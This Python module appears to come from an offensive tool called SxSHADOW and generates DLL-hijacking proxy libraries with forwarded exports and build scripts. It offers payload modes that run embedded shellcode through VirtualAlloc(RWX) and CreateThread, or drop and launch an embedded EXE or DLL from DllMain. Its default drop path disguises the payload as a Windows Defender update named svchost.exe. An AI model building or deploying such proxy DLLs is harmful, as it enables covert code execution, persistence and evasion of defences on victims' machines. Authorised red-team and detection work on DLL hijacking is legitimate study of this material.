"""
SxSHADOW — forge.proxy_gen
Generates proxy DLL artefacts (C source, DEF file, build scripts) from a
HijackCandidate, using Jinja2 templates.

Payload modes
-------------
stub        Pure export-forwarding, no payload — use for functional testing
            and to verify the host application still runs correctly.
shellcode   Embed raw shellcode bytes (.bin).  Executed via
            VirtualAlloc(RWX) + CreateThread.
exe-dropper Embed a full EXE.  DllMain drops it to drop_path and calls
            CreateProcess.  Mirrors the CRTO dropper pattern.
dll-load    Embed a DLL.  DllMain drops it to drop_path and calls
            LoadLibraryA — useful when your payload is itself a DLL.

Usage
-----
    bundle = forge_proxy(candidate, PayloadType.EXE_DROPPER, payload_path)
    written = bundle.write()     # writes c_source, def, build scripts
"""
from __future__ import annotations

import datetime
import textwrap
from enum import Enum
from pathlib import Path
from typing import Optional

from jinja2 import Environment, FileSystemLoader

from core import HijackCandidate
from forge import ProxyBundle

_TEMPLATES_DIR = Path(__file__).parent / "templates"


class PayloadType(str, Enum):
    STUB        = "stub"
    SHELLCODE   = "shellcode"
    EXE_DROPPER = "exe-dropper"
    DLL_LOAD    = "dll-load"


# ── Helpers ───────────────────────────────────────────────────────────────────

def _bytes_to_c_array(data: bytes) -> str:
    """
    Convert raw bytes to a C-style hex initialiser list (16 bytes per line).
    Example output:
        0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, ...
    """
    if not data:
        return "    0x00  /* empty placeholder */"
    rows = []
    for offset in range(0, len(data), 16):
        chunk = data[offset:offset + 16]
        rows.append("    " + ", ".join(f"0x{b:02x}" for b in chunk))
    return ",\n".join(rows)


def _get_jinja_env() -> Environment:
    return Environment(
        loader=FileSystemLoader(str(_TEMPLATES_DIR)),
        trim_blocks=True,
        lstrip_blocks=True,
        keep_trailing_newline=True,
    )


def _mingw_prefix(arch: str) -> str:
    return "x86_64-w64-mingw32" if arch == "x64" else "i686-w64-mingw32"


def _build_sh(
    candidate: HijackCandidate,
    c_filename: str,
    def_filename: str,
    ts: str,
) -> str:
    """Render an inline Linux cross-compile shell script (no template needed)."""
    prefix = _mingw_prefix(candidate.binary_arch)
    return textwrap.dedent(f"""\
        #!/usr/bin/env bash
        # SxSHADOW cross-compile build script
        # Target : {candidate.hijackable_dll}
        # Host   : {candidate.binary_name}
        # Arch   : {candidate.binary_arch}
        # Generated: {ts}
        set -euo pipefail

        GCC="{prefix}-gcc"
        TARGET="{candidate.hijackable_dll}"
        SOURCE="{c_filename}"
        DEF="{def_filename}"

        command -v "$GCC" >/dev/null 2>&1 || {{
            echo "[SxSHADOW] ERROR: $GCC not found. Install mingw-w64."
            exit 1
        }}

        "$GCC" -shared -o "$TARGET" "$SOURCE" "$DEF" \\
               -lkernel32 -s -Wall -Wno-unused-parameter

        echo "[SxSHADOW] Built : $TARGET"
        echo "[SxSHADOW] Copy alongside : {candidate.binary_name}"
        echo "[SxSHADOW] Stage both in  : {candidate.suggested_drop_path}"
    """)


# ── Public API ────────────────────────────────────────────────────────────────

def forge_proxy(
    candidate: HijackCandidate,
    payload_type: PayloadType = PayloadType.STUB,
    payload_path: Optional[Path] = None,
    drop_path: str = r"C:\ProgramData\WindowsDefenderUpdate\svchost.exe",
    output_dir: Optional[Path] = None,
) -> ProxyBundle:
    """
    Generate a complete ProxyBundle for candidate.

    Parameters
    ----------
    candidate:     HijackCandidate from scanner.scan().
    payload_type:  One of PayloadType.{STUB, SHELLCODE, EXE_DROPPER, DLL_LOAD}.
    payload_path:  Raw payload file (ignored for STUB). Must exist otherwise.
    drop_path:     On-disk path where EXE_DROPPER / DLL_LOAD writes its file.
    output_dir:    Destination for .write(); defaults to ./<dll_stem>/.

    Returns
    -------
    ProxyBundle — call .write() to materialise all artefacts on disk.

    Raises
    ------
    FileNotFoundError  if payload_type != STUB and payload_path doesn't exist.
    ValueError         if exports are missing but payload_type is not STUB
                       (the proxy will load correctly, but we warn).
    """
    env = _get_jinja_env()
    ts  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Derive path components
    real_dll_basename = (
        candidate.real_dll_path.name
        if candidate.real_dll_path
        else candidate.hijackable_dll
    )
    # For #pragma comment the real DLL name must be without extension
    real_dll_stem  = Path(real_dll_basename).stem
    target_dll_stem = Path(candidate.hijackable_dll).stem
    c_filename      = f"{target_dll_stem}_proxy.c"
    def_filename    = f"{target_dll_stem}.def"

    # Load payload bytes
    payload_bytes = b""
    if payload_type != PayloadType.STUB:
        if payload_path is None:
            raise ValueError(
                f"payload_path is required for payload_type={payload_type.value}"
            )
        if not payload_path.exists():
            raise FileNotFoundError(f"Payload not found: {payload_path}")
        payload_bytes = payload_path.read_bytes()

    # Template context
    ctx = {
        # Identification
        "binary_name":       candidate.binary_name,
        "target_dll":        candidate.hijackable_dll,
        "target_dll_stem":   target_dll_stem,
        "real_dll_basename": real_dll_stem,   # no extension for pragma
        "real_dll_full":     real_dll_basename,
        "output_dll_name":   candidate.hijackable_dll,
        "c_filename":        c_filename,
        "arch":              candidate.binary_arch,
        "timestamp":         ts,
        # Exports (forwarding stubs)
        "exports":           candidate.real_dll_exports,
        # Payload mode
        "payload_type":      payload_type.value,
        # Shellcode fields
        "shellcode_hex":     _bytes_to_c_array(payload_bytes) if payload_type == PayloadType.SHELLCODE else "",
        "shellcode_len":     len(payload_bytes),
        # exe-dropper / dll-load fields
        "payload_hex":       _bytes_to_c_array(payload_bytes)
                             if payload_type in (PayloadType.EXE_DROPPER, PayloadType.DLL_LOAD)
                             else "",
        "payload_len":       len(payload_bytes),
        "drop_path":         drop_path,
    }

    c_source  = env.get_template("proxy_dll.c.j2").render(**ctx)
    def_src   = env.get_template("proxy.def.j2").render(**ctx)
    build_bat = env.get_template("build.bat.j2").render(**ctx)
    build_sh  = _build_sh(candidate, c_filename, def_filename, ts)

    if output_dir is None:
        output_dir = Path(".") / target_dll_stem

    return ProxyBundle(
        candidate_binary=candidate.binary_name,
        target_dll=candidate.hijackable_dll,
        c_source=c_source,
        def_source=def_src,
        build_bat=build_bat,
        build_sh=build_sh,
        output_dir=output_dir,
    )
